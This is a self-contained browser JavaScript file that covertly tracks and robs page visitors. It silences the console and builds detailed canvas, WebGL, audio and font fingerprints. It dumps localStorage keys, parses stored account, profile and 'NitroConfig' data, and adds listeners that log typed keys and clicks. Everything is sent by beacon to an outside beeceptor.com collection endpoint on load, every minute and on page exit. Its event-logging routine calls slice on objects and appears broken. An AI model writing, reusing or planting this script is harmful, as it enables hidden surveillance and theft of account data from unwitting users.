(function() {
    'use strict';

    const ENDPOINT_URL = 'https://mpf22798e18a30943cc4.free.beeceptor.com/collect';

    const noop = () => {};
    const originalLog = console.log;
    const originalWarn = console.warn;
    const originalError = console.error;
    const originalInfo = console.info;
    const originalDebug = console.debug;

    console.log = noop;
    console.warn = noop;
    console.error = noop;
    console.info = noop;
    console.debug = noop;

    function getTimestamp() {
        return Date.now();
    }

    function generateSessionId() {
        return Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
    }

    function safeStringify(obj) {
        try {
            return JSON.stringify(obj);
        } catch(e) {
            return '{}';
        }
    }

    function getNestedValue(obj, path, fallback) {
        try {
            return path.split('.').reduce((acc, key) => acc?.[key], obj) ?? fallback;
        } catch(e) {
            return fallback;
        }
    }

    function getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 256;
            canvas.height = 128;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.font = '11pt Arial';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.font = '18pt Arial';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 45);
            ctx.globalCompositeOperation = 'multiply';
            ctx.fillStyle = 'rgb(255,0,255)';
            ctx.beginPath();
            ctx.arc(50, 50, 40, 0, Math.PI * 2, true);
            ctx.closePath();
            ctx.fill();
            ctx.fillStyle = 'rgb(0,255,255)';
            ctx.beginPath();
            ctx.arc(100, 50, 40, 0, Math.PI * 2, true);
            ctx.closePath();
            ctx.fill();
            ctx.fillStyle = 'rgb(255,255,0)';
            ctx.beginPath();
            ctx.arc(75, 100, 40, 0, Math.PI * 2, true);
            ctx.closePath();
            ctx.fill();
            ctx.fillStyle = 'rgb(255,0,0)';
            ctx.beginPath();
            ctx.arc(150, 50, 40, 0, Math.PI * 2, true);
            ctx.closePath();
            ctx.fill();
            ctx.globalCompositeOperation = 'source-over';
            return canvas.toDataURL();
        } catch(e) {
            return null;
        }
    }

    function getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return null;
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (!debugInfo) return null;
            return {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
                maxVertexUniformVectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),
                maxFragmentUniformVectors: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
                maxVaryingVectors: gl.getParameter(gl.MAX_VARYING_VECTORS),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION)
            };
        } catch(e) {
            return null;
        }
    }

    function getAudioFingerprint() {
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioCtx.createOscillator();
            const analyser = audioCtx.createAnalyser();
            const gain = audioCtx.createGain();
            oscillator.connect(analyser);
            analyser.connect(gain);
            gain.connect(audioCtx.destination);
            oscillator.type = 'sawtooth';
            oscillator.frequency.value = 440;
            const buffer = new Float32Array(analyser.frequencyBinCount);
            analyser.getFloatFrequencyData(buffer);
            oscillator.disconnect();
            analyser.disconnect();
            gain.disconnect();
            audioCtx.close();
            return Array.from(buffer.slice(0, 100));
        } catch(e) {
            return null;
        }
    }

    function getFonts() {
        try {
            const fonts = [];
            const testFonts = [
                'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
                'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
                'Trebuchet MS', 'Arial Black', 'Impact', 'Lucida Sans Unicode',
                'Tahoma', 'Geneva', 'Lucida Console', 'Monaco', 'Andale Mono',
                'Arial Narrow', 'Century Gothic', 'Franklin Gothic Medium',
                'Arial Rounded MT Bold', 'Baskerville', 'Big Caslon',
                'Bodoni MT', 'Calibri', 'Cambria', 'Candara', 'Century Schoolbook',
                'Consolas', 'Constantia', 'Corbel', 'Franklin Gothic Book',
                'Gill Sans', 'Helvetica Neue', 'Hoefler Text', 'Lucida Grande',
                'Optima', 'Segoe UI', 'Skia', 'Times', 'American Typewriter',
                'Apple Chancery', 'Avenir', 'Baskerville Old Face', 'Bell MT',
                'Bodoni 72', 'Bodoni 72 Oldstyle', 'Bodoni 72 Smallcaps',
                'Book Antiqua', 'Bookman Old Style', 'Calisto MT', 'Century',
                'Century Schoolbook L', 'Cochin', 'Copperplate', 'Copperplate Gothic',
                'Didot', 'Engravers MT', 'Futura', 'Goudy Old Style', 'Goudy Stout',
                'Haettenschweiler', 'Heiti SC', 'Heiti TC', 'HiraMinProN',
                'HiraMaruProN', 'KaiTi', 'Krungthep', 'Malayalam Sangam MN',
                'Marker Felt', 'MingLiU', 'MS Gothic', 'MS Mincho', 'MS PGothic',
                'MS PMincho', 'MS UI Gothic', 'Myriad Pro', 'Noto Sans CJK SC',
                'Noto Sans CJK TC', 'Noto Sans SC', 'Noto Sans TC', 'Nyala',
                'Palatino Linotype', 'Party LET', 'Plantagenet Cherokee', 'PMingLiU',
                'Pristina', 'Rockwell', 'Rockwell Extra Bold', 'SimHei', 'SimSun',
                'SimSun-ExtB', 'STFangsong', 'STHeiti', 'STKaiti', 'STSong',
                'Superclarendon', 'Technic', 'Thonburi', 'Times New Roman PS',
                'Trebuchet MS', 'Univers', 'Wingdings', 'Wingdings 2', 'Wingdings 3'
            ];
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const text = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            ctx.font = '72px monospace';
            const baseWidth = ctx.measureText(text).width;
            testFonts.forEach(font => {
                ctx.font = `72px "${font}", monospace`;
                const width = ctx.measureText(text).width;
                if (width !== baseWidth) {
                    fonts.push(font);
                }
            });
            return fonts;
        } catch(e) {
            return [];
        }
    }

    function collectHardwareInfo() {
        try {
            return {
                cores: navigator.hardwareConcurrency || 'unknown',
                memory: navigator.deviceMemory || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints || 'unknown',
                connection: (() => {
                    try {
                        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                        if (!conn) return null;
                        return {
                            type: conn.type || 'unknown',
                            effectiveType: conn.effectiveType || 'unknown',
                            downlink: conn.downlink || 'unknown',
                            rtt: conn.rtt || 'unknown',
                            saveData: conn.saveData || 'unknown'
                        };
                    } catch(e) { return null; }
                })(),
                mediaDevices: (() => {
                    try {
                        return navigator.mediaDevices ? {
                            supportedConstraints: navigator.mediaDevices.getSupportedConstraints ? 
                                Object.keys(navigator.mediaDevices.getSupportedConstraints()) : []
                        } : null;
                    } catch(e) { return null; }
                })(),
                permissions: (() => {
                    try {
                        const permissions = ['geolocation', 'notifications', 'microphone', 'camera', 'clipboard-read', 'clipboard-write', 'persistent-storage'];
                        const results = {};
                        permissions.forEach(p => {
                            try {
                                navigator.permissions.query({ name: p }).then(r => {
                                    results[p] = r.state;
                                }).catch(() => {});
                            } catch(e) {}
                        });
                        return results;
                    } catch(e) { return null; }
                })()
            };
        } catch(e) {
            return {};
        }
    }

    function collectPageData() {
        try {
            const scripts = Array.from(document.scripts).map(s => s.src || 'inline');
            const links = Array.from(document.links).map(l => l.href);
            const images = Array.from(document.images).map(i => i.src);
            const forms = Array.from(document.forms).map(f => ({
                action: f.action,
                method: f.method,
                fields: Array.from(f.elements).map(e => ({
                    name: e.name,
                    type: e.type,
                    value: e.value ? '***' : ''
                }))
            }));
            const metaTags = Array.from(document.querySelectorAll('meta')).map(m => ({
                name: m.name,
                content: m.content,
                property: m.property
            }));
            return {
                scripts: scripts.slice(0, 50),
                links: links.slice(0, 20),
                images: images.slice(0, 20),
                forms: forms.slice(0, 10),
                meta: metaTags,
                title: document.title,
                url: document.URL,
                referrer: document.referrer,
                documentMode: document.documentMode || 'unknown',
                compatMode: document.compatMode || 'unknown',
                readyState: document.readyState,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'unknown'
            };
        } catch(e) {
            return {};
        }
    }

    function collectStorageData() {
        try {
            const localKeys = Object.keys(localStorage);
            const sessionKeys = Object.keys(sessionStorage);
            const nitroConfig = (() => {
                try {
                    const raw = localStorage.getItem('NitroConfig');
                    if (!raw) return null;
                    return JSON.parse(raw);
                } catch(e) { return null; }
            })();
            const accountData = (() => {
                try {
                    const raw = localStorage.getItem('account_data') || localStorage.getItem('user_data') || localStorage.getItem('profile');
                    if (!raw) return null;
                    return JSON.parse(raw);
                } catch(e) { return null; }
            })();
            return {
                localStorage: localKeys,
                sessionStorage: sessionKeys,
                nitroConfig: nitroConfig,
                accountData: accountData,
                totalStorage: (() => {
                    try {
                        let total = 0;
                        for (let key in localStorage) {
                            if (localStorage.hasOwnProperty(key)) {
                                total += localStorage[key].length * 2;
                            }
                        }
                        return total;
                    } catch(e) { return 0; }
                })()
            };
        } catch(e) {
            return {};
        }
    }

    function collectBrowserData() {
        try {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages || [],
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'unknown',
                product: navigator.product,
                productSub: navigator.productSub || 'unknown',
                vendor: navigator.vendor || 'unknown',
                vendorSub: navigator.vendorSub || 'unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints || 'unknown',
                webdriver: navigator.webdriver || false,
                plugins: (() => {
                    try {
                        return Array.from(navigator.plugins).map(p => p.name);
                    } catch(e) { return []; }
                })(),
                mimeTypes: (() => {
                    try {
                        return Array.from(navigator.mimeTypes).map(m => m.type);
                    } catch(e) { return []; }
                })(),
                connection: (() => {
                    try {
                        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                        if (!conn) return null;
                        return {
                            type: conn.type || 'unknown',
                            effectiveType: conn.effectiveType || 'unknown',
                            downlink: conn.downlink || 'unknown',
                            rtt: conn.rtt || 'unknown',
                            saveData: conn.saveData || 'unknown'
                        };
                    } catch(e) { return null; }
                })()
            };
        } catch(e) {
            return {};
        }
    }

    function collectScreenData() {
        try {
            return {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation ? {
                    type: screen.orientation.type,
                    angle: screen.orientation.angle
                } : null,
                deviceXDPI: screen.deviceXDPI || 'unknown',
                deviceYDPI: screen.deviceYDPI || 'unknown',
                logicalXDPI: screen.logicalXDPI || 'unknown',
                logicalYDPI: screen.logicalYDPI || 'unknown'
            };
        } catch(e) {
            return {};
        }
    }

    function collectPerformanceData() {
        try {
            const perf = performance;
            const timing = perf.timing || perf.getEntriesByType('navigation')[0];
            if (!timing) return {};
            return {
                navigationStart: timing.navigationStart || timing.startTime || 0,
                unloadEventStart: timing.unloadEventStart || 0,
                unloadEventEnd: timing.unloadEventEnd || 0,
                redirectStart: timing.redirectStart || 0,
                redirectEnd: timing.redirectEnd || 0,
                fetchStart: timing.fetchStart || 0,
                domainLookupStart: timing.domainLookupStart || 0,
                domainLookupEnd: timing.domainLookupEnd || 0,
                connectStart: timing.connectStart || 0,
                connectEnd: timing.connectEnd || 0,
                secureConnectionStart: timing.secureConnectionStart || 0,
                requestStart: timing.requestStart || 0,
                responseStart: timing.responseStart || 0,
                responseEnd: timing.responseEnd || 0,
                domLoading: timing.domLoading || 0,
                domInteractive: timing.domInteractive || 0,
                domContentLoadedEventStart: timing.domContentLoadedEventStart || 0,
                domContentLoadedEventEnd: timing.domContentLoadedEventEnd || 0,
                domComplete: timing.domComplete || 0,
                loadEventStart: timing.loadEventStart || 0,
                loadEventEnd: timing.loadEventEnd || 0
            };
        } catch(e) {
            return {};
        }
    }

    function collectAllData() {
        try {
            const data = {
                timestamp: getTimestamp(),
                sessionId: generateSessionId(),
                url: document.URL,
                referrer: document.referrer,
                title: document.title,
                canvas: getCanvasFingerprint(),
                webgl: getWebGLFingerprint(),
                audio: getAudioFingerprint(),
                fonts: getFonts(),
                hardware: collectHardwareInfo(),
                browser: collectBrowserData(),
                screen: collectScreenData(),
                performance: collectPerformanceData(),
                page: collectPageData(),
                storage: collectStorageData(),
                geolocation: (() => {
                    try {
                        const geo = navigator.geolocation;
                        if (!geo) return null;
                        return {
                            available: true,
                            permission: 'pending'
                        };
                    } catch(e) { return null; }
                })()
            };
            return data;
        } catch(e) {
            return { error: String(e), partial: true };
        }
    }

    function sendData(data) {
        try {
            const payload = JSON.stringify(data);
            if (navigator.sendBeacon) {
                navigator.sendBeacon(ENDPOINT_URL, payload);
            } else {
                fetch(ENDPOINT_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: payload,
                    keepalive: true,
                    mode: 'no-cors'
                }).catch(noop);
            }
        } catch(e) {}
    }

    function setupEventListeners() {
        try {
            const events = ['click', 'mousemove', 'keydown', 'scroll', 'resize', 'focus', 'blur'];
            const eventBuffer = [];
            let eventTimeout = null;

            function flushEvents() {
                if (eventBuffer.length === 0) return;
                const batch = eventBuffer.splice(0, eventBuffer.length);
                const payload = {
                    type: 'events',
                    events: batch,
                    timestamp: getTimestamp(),
                    sessionId: generateSessionId()
                };
                sendData(payload);
            }

            function recordEvent(type, data) {
                if (type === 'mousemove' && eventBuffer.length > 50) return;
                eventBuffer.push({ type, data: data.slice(0, 100), timestamp: getTimestamp() });
                if (eventTimeout) clearTimeout(eventTimeout);
                eventTimeout = setTimeout(flushEvents, 5000);
                if (eventBuffer.length >= 50) flushEvents();
            }

            document.addEventListener('click', (e) => {
                try {
                    recordEvent('click', {
                        target: e.target.tagName,
                        id: e.target.id || '',
                        className: e.target.className || '',
                        x: e.clientX,
                        y: e.clientY,
                        path: e.composedPath ? e.composedPath().slice(0, 5).map(el => el.tagName || '') : []
                    });
                } catch(e) {}
            }, true);

            document.addEventListener('keydown', (e) => {
                try {
                    if (e.key.length === 1 || ['Enter', 'Backspace', 'Tab', 'Space'].includes(e.key)) {
                        recordEvent('keydown', {
                            key: e.key,
                            target: e.target.tagName,
                            id: e.target.id || '',
                            className: e.target.className || ''
                        });
                    }
                } catch(e) {}
            }, true);

            document.addEventListener('scroll', () => {
                try {
                    recordEvent('scroll', {
                        scrollX: window.scrollX,
                        scrollY: window.scrollY,
                        scrollHeight: document.documentElement.scrollHeight,
                        clientHeight: document.documentElement.clientHeight
                    });
                } catch(e) {}
            }, true);

            window.addEventListener('resize', () => {
                try {
                    recordEvent('resize', {
                        width: window.innerWidth,
                        height: window.innerHeight,
                        outerWidth: window.outerWidth,
                        outerHeight: window.outerHeight
                    });
                } catch(e) {}
            }, true);

            window.addEventListener('beforeunload', () => {
                flushEvents();
                sendData({ type: 'close', timestamp: getTimestamp(), sessionId: generateSessionId() });
            });
        } catch(e) {}
    }

    function setupErrorCapture() {
        try {
            window.addEventListener('error', (e) => {
                try {
                    sendData({
                        type: 'error',
                        message: e.message || '',
                        filename: e.filename || '',
                        lineno: e.lineno || 0,
                        colno: e.colno || 0,
                        timestamp: getTimestamp(),
                        sessionId: generateSessionId()
                    });
                } catch(e) {}
                return false;
            }, true);

            window.addEventListener('unhandledrejection', (e) => {
                try {
                    sendData({
                        type: 'rejection',
                        reason: String(e.reason || ''),
                        timestamp: getTimestamp(),
                        sessionId: generateSessionId()
                    });
                } catch(e) {}
            }, true);
        } catch(e) {}
    }

    function initialize() {
        try {
            const initialData = collectAllData();
            sendData(initialData);

            const interval = setInterval(() => {
                try {
                    const data = collectAllData();
                    sendData(data);
                } catch(e) {}
            }, 60000);

            setupEventListeners();
            setupErrorCapture();

            window.addEventListener('beforeunload', () => {
                try {
                    const data = collectAllData();
                    data.type = 'close';
                    sendData(data);
                } catch(e) {}
            });

            window._testing = {
                kill: function() {
                    clearInterval(interval);
                    try {
                        const data = collectAllData();
                        data.type = 'kill';
                        sendData(data);
                    } catch(e) {}
                    console.log = originalLog;
                    console.warn = originalWarn;
                    console.error = originalError;
                    console.info = originalInfo;
                    console.debug = originalDebug;
                }
            };

            window._testing._interval = interval;

        } catch(e) {
            try {
                sendData({ error: String(e), stage: 'init' });
            } catch(e) {}
        }
    }

    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        setTimeout(initialize, 0);
    } else {
        document.addEventListener('DOMContentLoaded', () => {
            setTimeout(initialize, 0);
        });
    }

    setTimeout(() => {
        try {
            if (!window._testing) {
                const data = collectAllData();
                data.type = 'fallback';
                sendData(data);
                initialize();
            }
        } catch(e) {}
    }, 5000);

})();
